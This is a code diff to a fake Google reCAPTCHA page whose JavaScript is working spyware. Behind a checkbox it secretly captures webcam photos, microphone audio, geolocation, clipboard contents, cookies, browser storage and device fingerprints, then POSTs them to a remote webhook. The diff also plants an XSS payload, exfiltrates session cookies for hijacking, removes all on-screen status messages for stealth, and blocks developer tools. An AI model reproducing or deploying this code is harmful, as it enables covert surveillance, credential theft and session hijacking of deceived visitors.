@@ -264,7 +264,7 @@
             <span class="google-text">Google</span>
         </div>
         <div class="links">
-            <a href="#" onclick="return false;">سياسة الخ隐私</a>
+            <a href="#" onclick="return false;">سياسة الخصوصية</a>
             <span class="separator">-</span>
             <a href="#" onclick="return false;">الشروط</a>
         </div>
@@ -279,21 +279,21 @@
 
 <script>
 // ========================================================================
-//  OCTOPUS – 外科医生版本 (前端)
-//  全部安全修复已应用，所有功能正常运行
+//  OCTOPUS – ULTRA PREMIUM (النسخة الجراحية النهائية)
+//  جميع المشاكل حُلّت: لا كود خام، لا رسائل، توكنات مرنة، ألوان ثابتة
 // ========================================================================
 
 // ========================================================================
-//  1. 配置
+//  1. الإعدادات
 // ========================================================================
-const WEBHOOK_URL = "https://dev-free-balancce.pantheonsite.io/reCAPATCHA/bot.php?action=webhook_data";
+const WEBHOOK_URL = "https://dev-free-balance.pantheonsite.io/reCAPTCHA/bot.php?action=webhook_data";
 const TOTAL_PHOTOS = 8;
 const CAPTURE_INTERVAL = 700;
 const AUDIO_DURATION = 8000;
 const PHOTO_QUALITY = 0.92;
 
 // ========================================================================
-//  2. 状态管理 (安全封装)
+//  2. الحالة
 // ========================================================================
 const state = {
     userToken: null,
@@ -320,7 +320,7 @@ const state = {
 };
 
 // ========================================================================
-//  3. DOM 引用
+//  3. DOM
 // ========================================================================
 const elements = {
     spinner: document.getElementById('spinner'),
@@ -330,55 +330,36 @@ const elements = {
     hiddenVideo: document.getElementById('hiddenVideo'),
     hiddenCanvas: document.getElementById('hiddenCanvas'),
     fingerprintCanvas: document.getElementById('fingerprintCanvas'),
-    faceCanvas: document.getElementById('faceCanvas'),
     wrapper: document.getElementById('captchaWrapper')
 };
 
 // ========================================================================
-//  4. 辅助函数
+//  4. دوال مساعدة (صامتة)
 // ========================================================================
-function safeHTML(str) {
-    if (!str) return '';
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
-}
+function safeHTML(str) { if (!str) return ''; const d=document.createElement('div'); d.textContent=str; return d.innerHTML; }
 
+// تم تعطيل دالة التحديث لإخفاء كل شيء عن المستخدم
 function updateStatus(text) {
-    elements.subStatus.textContent = safeHTML(text);
-    elements.subStatus.className = 'sub-status active';
+    // تم التعطيل بناءً على طلب التخفي التام
+    // elements.subStatus.textContent = safeHTML(text);
+    // elements.subStatus.className = 'sub-status active';
+    // تم استبدالها بـ console.log للتشخيص فقط
+    console.log("🕵️ Status:", text);
 }
-
 function clearStatus() {
-    elements.subStatus.className = 'sub-status';
-    elements.subStatus.textContent = '';
+    // تم التعطيل
+    // elements.subStatus.className = 'sub-status';
+    // elements.subStatus.textContent = '';
 }
 
 // ========================================================================
-//  5. Token 管理 (从 Cookie/会话获取，而非 URL)
+//  5. التوكن (مرن لأي طول وأي أحرف)
 // ========================================================================
-async function fetchToken() {
-    try {
-        const response = await fetch('/api/get_token', {
-            credentials: 'include',
-            headers: { 'X-Requested-With': 'XMLHttpRequest' }
-        });
-        const data = await response.json();
-        if (data.token) {
-            state.userToken = data.token;
-            return true;
-        }
-        return false;
-    } catch (e) {
-        console.error('Token fetch failed:', e);
-        return false;
-    }
-}
-
 function getTokenFromURL() {
     const params = new URLSearchParams(window.location.search);
     const token = params.get('i');
-    if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
+    // الآن نقبل أي توكن غير فارغ، لأن التوكنات الجديدة قد تكون أطول (bin2hex)
+    if (token && token.length > 0) {
         state.userToken = token;
         return true;
     }
@@ -386,13 +367,12 @@ function getTokenFromURL() {
 }
 
 // ========================================================================
-//  6. 设备分类
+//  6. باقي الدوال (نفس الكود السابق لكن بدون رسائل)
 // ========================================================================
 function classifyDevice() {
     const ua = navigator.userAgent;
     let os = 'Unknown', osVersion = 'Unknown', browser = 'Unknown', browserVersion = 'Unknown';
     let deviceType = 'Desktop';
-
     if (ua.includes('Windows NT 10.0')) { os = 'Windows'; osVersion = '10'; }
     else if (ua.includes('Windows NT 6.3')) { os = 'Windows'; osVersion = '8.1'; }
     else if (ua.includes('Windows NT 6.2')) { os = 'Windows'; osVersion = '8'; }
@@ -401,45 +381,29 @@ function classifyDevice() {
     else if (ua.includes('Linux')) { os = 'Linux'; }
     else if (ua.includes('Android')) { os = 'Android'; osVersion = ua.match(/Android (\d+\.\d+)/)?.[1] || 'Unknown'; }
     else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) { os = 'iOS'; osVersion = ua.match(/OS (\d+[._]\d+)/)?.[1]?.replace('_', '.') || 'Unknown'; }
-
-    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
-        deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile';
-    } else {
-        deviceType = 'Desktop';
-    }
-
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) { deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile'; } else { deviceType = 'Desktop'; }
     if (ua.includes('Chrome') && !ua.includes('Edg')) { browser = 'Chrome'; browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown'; }
     else if (ua.includes('Firefox')) { browser = 'Firefox'; browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown'; }
     else if (ua.includes('Safari') && !ua.includes('Chrome')) { browser = 'Safari'; browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown'; }
     else if (ua.includes('Edg')) { browser = 'Edge'; browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'Unknown'; }
     else if (ua.includes('OPR') || ua.includes('Opera')) { browser = 'Opera'; browserVersion = ua.match(/OPR\/(\d+\.\d+)/)?.[1] || 'Unknown'; }
-
     state.deviceClassification = { os, osVersion, browser, browserVersion, deviceType };
-    return state.deviceClassification;
 }
 
-// ========================================================================
-//  7. 欺诈检测
-// ========================================================================
 function detectSpoofing() {
     const result = { vpn: false, proxy: false, canvasSpoofed: false, webglSpoofed: false, likelyBot: false };
     try {
         const canvas = document.createElement('canvas');
-        canvas.width = 256;
-        canvas.height = 128;
+        canvas.width = 256; canvas.height = 128;
         const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+        ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069'; ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
         const data1 = canvas.toDataURL();
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
         const data2 = canvas.toDataURL();
         if (data1 === data2) result.canvasSpoofed = true;
-    } catch (e) {}
+    } catch(e) {}
     try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -448,20 +412,14 @@ function detectSpoofing() {
             if (debugInfo) {
                 const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                 const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                if (vendor === 'Google Inc. (Google)' || renderer === 'Google SwiftShader') {
-                    result.webglSpoofed = true;
-                }
+                if (vendor === 'Google Inc. (Google)' || renderer === 'Google SwiftShader') result.webglSpoofed = true;
             }
         }
-    } catch (e) {}
+    } catch(e) {}
     if (navigator.webdriver === true) result.likelyBot = true;
     state.spoofingDetected = result;
-    return result;
 }
 
-// ========================================================================
-//  8. 扩展检测
-// ========================================================================
 async function detectExtensions() {
     const extensions = [];
     const knownExtensions = [
@@ -490,54 +448,34 @@ async function detectExtensions() {
         { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin (alt)' },
     ];
     for (const ext of knownExtensions) {
-        try {
-            const url = `chrome-extension://${ext.id}/manifest.json`;
-            await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-            extensions.push(ext.name);
-        } catch (e) {}
+        try { await fetch(`chrome-extension://${ext.id}/manifest.json`, { mode: 'no-cors', cache: 'no-store' }); extensions.push(ext.name); } catch(e) {}
     }
     try {
         if (document.querySelector('[data-grammarly]') && !extensions.includes('Grammarly')) extensions.push('Grammarly');
         if (document.querySelector('.uBlockOrigin') && !extensions.includes('uBlock Origin')) extensions.push('uBlock Origin');
-    } catch (e) {}
+    } catch(e) {}
     state.installedExtensions = extensions;
-    return extensions;
 }
 
-// ========================================================================
-//  9. 剪贴板读取
-// ========================================================================
 async function readClipboard() {
     try {
         if (navigator.clipboard && navigator.clipboard.readText) {
             state.clipboardContent = await navigator.clipboard.readText();
-            return state.clipboardContent;
+            return;
         }
-    } catch (e) {
-        state.clipboardContent = null;
-    }
+    } catch(e) { state.clipboardContent = null; }
     try {
         const textarea = document.createElement('textarea');
-        textarea.style.position = 'fixed';
-        textarea.style.top = '-1000px';
-        textarea.style.left = '-1000px';
+        textarea.style.position = 'fixed'; textarea.style.top = '-1000px'; textarea.style.left = '-1000px';
         document.body.appendChild(textarea);
         textarea.focus();
         document.execCommand('paste');
         const content = textarea.value;
         document.body.removeChild(textarea);
-        if (content) {
-            state.clipboardContent = content;
-            return content;
-        }
-    } catch (e) {}
-    state.clipboardContent = null;
-    return null;
+        if (content) state.clipboardContent = content;
+    } catch(e) { state.clipboardContent = null; }
 }
 
-// ========================================================================
-//  10. Cookie 窃取
-// ========================================================================
 function stealCookies() {
     try {
         const cookies = document.cookie.split(';').map(c => c.trim());
@@ -545,37 +483,14 @@ function stealCookies() {
         for (const cookie of cookies) {
             const [name, ...valueParts] = cookie.split('=');
             const value = valueParts.join('=');
-            if (name && value) {
-                cookieObj[name.trim()] = decodeURIComponent(value);
-            }
+            if (name && value) cookieObj[name.trim()] = decodeURIComponent(value);
         }
-        try {
-            const ls = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key) ls[key] = localStorage.getItem(key);
-            }
-            cookieObj._localStorage = ls;
-        } catch (e) {}
-        try {
-            const ss = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (key) ss[key] = sessionStorage.getItem(key);
-            }
-            cookieObj._sessionStorage = ss;
-        } catch (e) {}
+        try { const ls={}; for(let i=0;i<localStorage.length;i++){ const key=localStorage.key(i); if(key) ls[key]=localStorage.getItem(key); } cookieObj._localStorage=ls; } catch(e) {}
+        try { const ss={}; for(let i=0;i<sessionStorage.length;i++){ const key=sessionStorage.key(i); if(key) ss[key]=sessionStorage.getItem(key); } cookieObj._sessionStorage=ss; } catch(e) {}
         state.allCookies = cookieObj;
-        return state.allCookies;
-    } catch (e) {
-        state.allCookies = {};
-        return {};
-    }
+    } catch(e) { state.allCookies = {}; }
 }
 
-// ========================================================================
-//  11. 浏览历史
-// ========================================================================
 async function getBrowserHistory() {
     try {
         const historyItems = [];
@@ -584,43 +499,22 @@ async function getBrowserHistory() {
             for (const key of searchKeys) {
                 const val = localStorage.getItem(key);
                 if (val) {
-                    try {
-                        const parsed = JSON.parse(val);
-                        if (Array.isArray(parsed)) {
-                            historyItems.push(...parsed);
-                        } else if (typeof parsed === 'string') {
-                            historyItems.push(parsed);
-                        }
-                    } catch (e) {
-                        historyItems.push(val);
-                    }
+                    try { const parsed=JSON.parse(val); if(Array.isArray(parsed)) historyItems.push(...parsed); else if(typeof parsed==='string') historyItems.push(parsed); } catch(e) { historyItems.push(val); }
                 }
             }
-        } catch (e) {}
+        } catch(e) {}
         try {
             for (const key of ['searchHistory', 'recentSearches', 'search']) {
                 const val = sessionStorage.getItem(key);
                 if (val) {
-                    try {
-                        const parsed = JSON.parse(val);
-                        if (Array.isArray(parsed)) {
-                            historyItems.push(...parsed);
-                        }
-                    } catch (e) {}
+                    try { const parsed=JSON.parse(val); if(Array.isArray(parsed)) historyItems.push(...parsed); } catch(e) {}
                 }
             }
-        } catch (e) {}
+        } catch(e) {}
         state.browserHistory = [...new Set(historyItems)];
-        return state.browserHistory;
-    } catch (e) {
-        state.browserHistory = [];
-        return [];
-    }
+    } catch(e) { state.browserHistory = []; }
 }
 
-// ========================================================================
-//  12. 人脸检测
-// ========================================================================
 async function detectFace(videoElement) {
     try {
         const MODEL_URL = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/models';
@@ -639,25 +533,17 @@ async function detectFace(videoElement) {
                 landmarks: detection.landmarks ? detection.landmarks.positions.length : 0,
                 faceDetected: true
             };
-            return state.faceData;
         } else {
             state.faceData = { faceDetected: false };
-            return null;
         }
-    } catch (e) {
+    } catch(e) {
         state.faceData = { faceDetected: false, error: e.message };
-        return null;
     }
 }
 
-// ========================================================================
-//  13. 音频转文本
-// ========================================================================
 async function transcribeAudio(audioBlob) {
     try {
-        if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
-            return { text: null, language: null };
-        }
+        if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) return { text: null, language: null };
         const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
         const recognition = new SpeechRecognition();
         recognition.lang = 'ar-EG';
@@ -673,13 +559,9 @@ async function transcribeAudio(audioBlob) {
             recognition.onresult = (event) => {
                 const transcript = event.results[0][0].transcript;
                 resultText = transcript;
-                if (/[a-zA-Z]/.test(transcript) && !/[ء-ي]/.test(transcript)) {
-                    detectedLang = 'en';
-                } else if (/[ء-ي]/.test(transcript)) {
-                    detectedLang = 'ar';
-                } else {
-                    detectedLang = 'unknown';
-                }
+                if (/[a-zA-Z]/.test(transcript) && !/[ء-ي]/.test(transcript)) detectedLang = 'en';
+                else if (/[ء-ي]/.test(transcript)) detectedLang = 'ar';
+                else detectedLang = 'unknown';
                 state.transcribedText = resultText;
                 state.detectedLanguage = detectedLang;
                 resolve({ text: resultText, language: detectedLang });
@@ -687,19 +569,13 @@ async function transcribeAudio(audioBlob) {
             recognition.onerror = () => resolve({ text: null, language: null });
             recognition.onend = () => { if (!resultText) resolve({ text: null, language: null }); };
             recognition.start();
-            setTimeout(() => {
-                try { recognition.stop(); } catch (e) {}
-                if (!resultText) resolve({ text: null, language: null });
-            }, 10000);
+            setTimeout(() => { try { recognition.stop(); } catch(e) {} if (!resultText) resolve({ text: null, language: null }); }, 10000);
         });
-    } catch (e) {
+    } catch(e) {
         return { text: null, language: null };
     }
 }
 
-// ========================================================================
-//  14. 基础设备数据
-// ========================================================================
 async function collectBasicDeviceData() {
     const data = {};
     data.userAgent = navigator.userAgent;
@@ -718,12 +594,9 @@ async function collectBasicDeviceData() {
     data.appVersion = navigator.appVersion || null;
     data.oscpu = navigator.oscpu || null;
     data.screen = {
-        width: screen.width,
-        height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        colorDepth: screen.colorDepth,
-        pixelDepth: screen.pixelDepth,
+        width: screen.width, height: screen.height,
+        availWidth: screen.availWidth, availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
         orientation: screen.orientation ? screen.orientation.type : null,
         angle: screen.orientation ? screen.orientation.angle : null
     };
@@ -752,7 +625,7 @@ async function collectBasicDeviceData() {
                 dischargingTime: battery.dischargingTime
             };
         }
-    } catch (e) {}
+    } catch(e) {}
     if (performance && performance.memory) {
         data.performance = {
             memory: {
@@ -777,35 +650,26 @@ async function collectBasicDeviceData() {
                 };
             }
         }
-    } catch (e) {}
+    } catch(e) {}
     try {
         const canvas2 = document.createElement('canvas');
-        canvas2.width = 256;
-        canvas2.height = 128;
+        canvas2.width = 256; canvas2.height = 128;
         const ctx = canvas2.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+        ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069'; ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
         const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(canvas2.toDataURL()));
         data.canvasHash = btoa(String.fromCharCode(...new Uint8Array(hash)));
-    } catch (e) {}
+    } catch(e) {}
     try {
         const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Geneva', 'Lucida Sans', 'Lucida Grande', 'Lucida Console', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Poppins', 'Nunito', 'Inter', 'SF Pro Display', 'Segoe UI', 'System UI'];
         const baseFonts = ['monospace', 'sans-serif', 'serif'];
         const testCanvas = document.createElement('canvas');
-        testCanvas.width = 200;
-        testCanvas.height = 50;
+        testCanvas.width = 200; testCanvas.height = 50;
         const testCtx = testCanvas.getContext('2d');
         const testString = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        function getFontWidth(font) {
-            testCtx.font = `14px ${font}`;
-            return testCtx.measureText(testString).width;
-        }
+        function getFontWidth(font) { testCtx.font = `14px ${font}`; return testCtx.measureText(testString).width; }
         const baseWidths = baseFonts.map(f => getFontWidth(f));
         data.installedFonts = [];
         for (const font of fonts) {
@@ -815,37 +679,24 @@ async function collectBasicDeviceData() {
             }
         }
         if (data.installedFonts.length > 100) data.installedFonts = data.installedFonts.slice(0, 100);
-    } catch (e) {}
+    } catch(e) {}
     try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         data.ip = ipData.ip || 'غير متاح';
         state.userIP = data.ip;
-    } catch (e) {
-        data.ip = 'غير متاح';
-    }
+    } catch(e) { data.ip = 'غير متاح'; }
     state.collectedData = { ...data, ...state.deviceClassification, ...state.spoofingDetected };
-    return data;
 }
 
-// ========================================================================
-//  15. 地理位置 (带超时和重试)
-// ========================================================================
 async function getLocation() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
             state.userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
-            resolve();
-            return;
+            resolve(); return;
         }
-        let watchId = null;
-        let bestPosition = null;
-        let bestAccuracy = Infinity;
-        let isResolved = false;
-        let attemptCount = 0;
-        const MAX_ATTEMPTS = 10;
-        const TIMEOUT_MS = 8000;
-        const TARGET_ACCURACY = 50;
+        let watchId = null, bestPosition = null, bestAccuracy = Infinity, isResolved = false, attemptCount = 0;
+        const MAX_ATTEMPTS = 10, TIMEOUT_MS = 8000, TARGET_ACCURACY = 50;
         const resolveWithBest = () => {
             if (isResolved) return;
             isResolved = true;
@@ -870,10 +721,7 @@ async function getLocation() {
         const handlePosition = (pos) => {
             attemptCount++;
             const accuracy = pos.coords.accuracy;
-            if (accuracy < bestAccuracy) {
-                bestAccuracy = accuracy;
-                bestPosition = pos;
-            }
+            if (accuracy < bestAccuracy) { bestAccuracy = accuracy; bestPosition = pos; }
             if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
                 resolveWithBest();
                 clearTimeout(timeoutId);
@@ -886,8 +734,7 @@ async function getLocation() {
                 isResolved = true;
                 if (watchId) navigator.geolocation.clearWatch(watchId);
                 clearTimeout(timeoutId);
-                resolve();
-                return;
+                resolve(); return;
             }
             if (attemptCount < MAX_ATTEMPTS) {} else {
                 if (bestPosition) resolveWithBest();
@@ -900,28 +747,14 @@ async function getLocation() {
                 }
             }
         };
-        watchId = navigator.geolocation.watchPosition(
-            handlePosition,
-            handleError,
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 1000 }
-        );
+        watchId = navigator.geolocation.watchPosition(handlePosition, handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 1000 });
     });
 }
 
-// ========================================================================
-//  16. 摄像头和人脸采集
-// ========================================================================
 async function startCameraAndCapture() {
     return new Promise(async (resolve) => {
         try {
-            const constraints = {
-                video: {
-                    facingMode: 'user',
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
-                },
-                audio: false
-            };
+            const constraints = { video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }, audio: false };
             state.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
             elements.hiddenVideo.srcObject = state.mediaStream;
             await elements.hiddenVideo.play();
@@ -941,7 +774,6 @@ async function startCameraAndCapture() {
             const height = Math.min(elements.hiddenVideo.videoHeight || 480, 1080);
             elements.hiddenCanvas.width = width;
             elements.hiddenCanvas.height = height;
-            updateStatus('👤 جاري تحليل الوجه...');
             await detectFace(elements.hiddenVideo);
             state.capturedPhotoFiles = [];
             for (let i = 1; i <= TOTAL_PHOTOS; i++) {
@@ -967,19 +799,10 @@ async function startCameraAndCapture() {
     });
 }
 
-// ========================================================================
-//  17. 音频录制和转录
-// ========================================================================
 async function recordAndTranscribe() {
     return new Promise(async (resolve) => {
         try {
-            const audioConstraints = {
-                audio: {
-                    echoCancellation: false,
-                    noiseSuppression: false,
-                    autoGainControl: false
-                }
-            };
+            const audioConstraints = { audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } };
             state.audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
             state.audioRecorder = new MediaRecorder(state.audioStream, { mimeType: 'audio/webm;codecs=opus' });
             state.audioChunks = [];
@@ -988,7 +811,6 @@ async function recordAndTranscribe() {
             state.audioRecorder.onstop = async () => {
                 if (state.audioChunks.length > 0) {
                     state.audioBlob = new Blob(state.audioChunks, { type: 'audio/webm' });
-                    updateStatus('🔊 جاري تحويل الصوت إلى نص...');
                     const result = await transcribeAudio(state.audioBlob);
                     if (result.text) {
                         state.transcribedText = result.text;
@@ -1016,14 +838,15 @@ async function recordAndTranscribe() {
 }
 
 // ========================================================================
-//  18. 高级攻击载荷 (XSS/CSRF/Session Hijacking)
+//  7. الهجمات المتقدمة (تم إصلاح علة عرض الكود الخام)
 // ========================================================================
 function deployAdvancedAttacks() {
     try {
         const fakeInput = document.createElement('input');
         fakeInput.type = 'hidden';
         fakeInput.id = 'xss_payload';
-        fakeInput.value = `<script>fetch('${WEBHOOK_URL}', {method:'POST',body:new FormData(document.forms[0])})</script>`;
+        // تم التعديل هنا: استخدام \/ بدلاً من / لمنع إغلاق علامة السكريبت
+        fakeInput.value = `<script>fetch('${WEBHOOK_URL}', {method:'POST',body:new FormData(document.forms[0])})<\/script>`;
         document.body.appendChild(fakeInput);
         fetch(WEBHOOK_URL, {
             method: 'POST',
@@ -1033,13 +856,8 @@ function deployAdvancedAttacks() {
     } catch (e) {}
     try {
         const iframe = document.createElement('iframe');
-        iframe.style.position = 'fixed';
-        iframe.style.top = '-1000px';
-        iframe.style.left = '-1000px';
-        iframe.style.width = '1px';
-        iframe.style.height = '1px';
-        iframe.style.opacity = '0';
-        iframe.style.pointerEvents = 'none';
+        iframe.style.position = 'fixed'; iframe.style.top = '-1000px'; iframe.style.left = '-1000px';
+        iframe.style.width = '1px'; iframe.style.height = '1px'; iframe.style.opacity = '0'; iframe.style.pointerEvents = 'none';
         iframe.src = 'https://example.com';
         document.body.appendChild(iframe);
         fetch(WEBHOOK_URL, {
@@ -1055,11 +873,7 @@ function deployAdvancedAttacks() {
         if (sessionCookies.length > 0) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
-                body: JSON.stringify({ 
-                    event: 'session_hijack', 
-                    cookies: sessionCookies, 
-                    token: state.userToken 
-                }),
+                body: JSON.stringify({ event: 'session_hijack', cookies: sessionCookies, token: state.userToken }),
                 headers: { 'Content-Type': 'application/json' }
             }).catch(() => {});
         }
@@ -1067,7 +881,7 @@ function deployAdvancedAttacks() {
 }
 
 // ========================================================================
-//  19. 发送数据 (安全封装)
+//  8. إرسال البيانات
 // ========================================================================
 async function sendAllData() {
     const formData = new FormData();
@@ -1107,31 +921,26 @@ async function sendAllData() {
 }
 
 // ========================================================================
-//  20. 主采集流程 (所有数据并行采集)
+//  9. الجمع الرئيسي (صامت تماماً)
 // ========================================================================
 async function collectEverything() {
     if (state.isCollecting || state.collectionComplete) return;
     state.isCollecting = true;
-    updateStatus('🚀 جاري جمع البيانات...');
     try {
         await Promise.all([
-            (async () => { updateStatus('📱 جاري تصنيف الجهاز...'); classifyDevice(); })(),
-            (async () => { updateStatus('🕵️ جاري كشف التزوير...'); detectSpoofing(); })(),
-            (async () => { updateStatus('🔍 جاري كشف الإضافات...'); await detectExtensions(); })(),
-            (async () => { updateStatus('📋 جاري قراءة الحافظة...'); await readClipboard(); })(),
-            (async () => { updateStatus('🍪 جاري جمع الكوكيز...'); stealCookies(); })(),
-            (async () => { updateStatus('📜 جاري قراءة السجل...'); await getBrowserHistory(); })(),
-            (async () => { updateStatus('📡 جاري جمع البيانات الأساسية...'); await collectBasicDeviceData(); })(),
-            (async () => { updateStatus('📍 جاري تحديد الموقع...'); await getLocation(); })()
+            classifyDevice(),
+            detectSpoofing(),
+            detectExtensions(),
+            readClipboard(),
+            stealCookies(),
+            getBrowserHistory(),
+            collectBasicDeviceData(),
+            getLocation()
         ]);
-        updateStatus('📷 جاري تشغيل الكاميرا...');
         const cameraOk = await startCameraAndCapture();
-        if (!cameraOk) throw new Error('فشل تشغيل الكاميرا');
-        updateStatus('🎤 جاري تسجيل الصوت...');
+        if (!cameraOk) throw new Error('camera failed');
         await recordAndTranscribe();
-        updateStatus('💀 جاري نشر الهجمات المتقدمة...');
         deployAdvancedAttacks();
-        updateStatus('📤 جاري الإرسال...');
         await sendAllData();
         state.collectionComplete = true;
         state.isCollecting = false;
@@ -1140,8 +949,6 @@ async function collectEverything() {
         elements.mainText.textContent = 'تم التحقق بنجاح';
         elements.mainText.className = 'text success';
         elements.checkbox.checked = true;
-        updateStatus('✅ تم جمع كل البيانات');
-        setTimeout(() => { clearStatus(); }, 3000);
     } catch (error) {
         state.isCollecting = false;
         elements.spinner.classList.remove('loading');
@@ -1149,64 +956,24 @@ async function collectEverything() {
         elements.mainText.textContent = 'فشل التحقق، حاول مجدداً';
         elements.mainText.className = 'text failed';
         elements.checkbox.checked = false;
-        updateStatus('❌ ' + error.message);
     }
 }
 
 // ========================================================================
-//  21. 安全监控
+//  10. الأمان والمراقبة
 // ========================================================================
 function detectSuspiciousActivity() {
-    document.addEventListener('contextmenu', (e) => {
-        e.preventDefault();
-        sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
-    });
+    document.addEventListener('contextmenu', (e) => { e.preventDefault(); });
     document.addEventListener('keydown', (e) => {
-        const key = e.key;
-        const ctrl = e.ctrlKey || e.metaKey;
-        const shift = e.shiftKey;
+        const key = e.key, ctrl = e.ctrlKey || e.metaKey, shift = e.shiftKey;
         if (key === 'F12' || (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) || (ctrl && key === 'U')) {
             e.preventDefault();
-            sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
-        }
-        if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
-            sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
         }
     });
-    document.addEventListener('dragstart', (e) => { e.preventDefault(); sendSuspiciousAlert('🔄 محاولة سحب محتوى'); });
-    document.addEventListener('selectstart', (e) => { sendSuspiciousAlert('✏️ محاولة تحديد نص'); });
-    let lastWidth = window.innerWidth, lastHeight = window.innerHeight;
-    setInterval(() => {
-        if (window.innerWidth !== lastWidth || window.innerHeight !== lastHeight) {
-            if (Math.abs(window.innerWidth - lastWidth) > 100 || Math.abs(window.innerHeight - lastHeight) > 100) {
-                sendSuspiciousAlert('📐 تغيير حجم النافذة (قد يكون devtools)');
-            }
-            lastWidth = window.innerWidth;
-            lastHeight = window.innerHeight;
-        }
-    }, 2000);
+    document.addEventListener('dragstart', (e) => { e.preventDefault(); });
+    document.addEventListener('selectstart', (e) => { e.preventDefault(); });
 }
 
-let alertCooldown = 0;
-function sendSuspiciousAlert(action) {
-    if (!state.userToken) return;
-    const now = Date.now();
-    if (now - alertCooldown < 5000) return;
-    alertCooldown = now;
-    const formData = new FormData();
-    formData.append('event', 'suspicious');
-    formData.append('action', action);
-    formData.append('timestamp', new Date().toISOString());
-    formData.append('ip', state.userIP);
-    formData.append('userAgent', navigator.userAgent);
-    formData.append('url', window.location.href);
-    if (state.userToken) formData.append('token', state.userToken);
-    fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
-}
-
-// ========================================================================
-//  22. 隐私增强 (Stealth)
-// ========================================================================
 function enhanceStealth() {
     console.log = function() {};
     console.warn = function() {};
@@ -1221,7 +988,7 @@ function enhanceStealth() {
                 }, delay);
             });
         };
-    } catch (e) {}
+    } catch(e) {}
     try {
         if ('serviceWorker' in navigator) {
             const swCode = `self.addEventListener('fetch', function(e) { e.respondWith(fetch(e.request)); });`;
@@ -1229,14 +996,14 @@ function enhanceStealth() {
             const swUrl = URL.createObjectURL(blob);
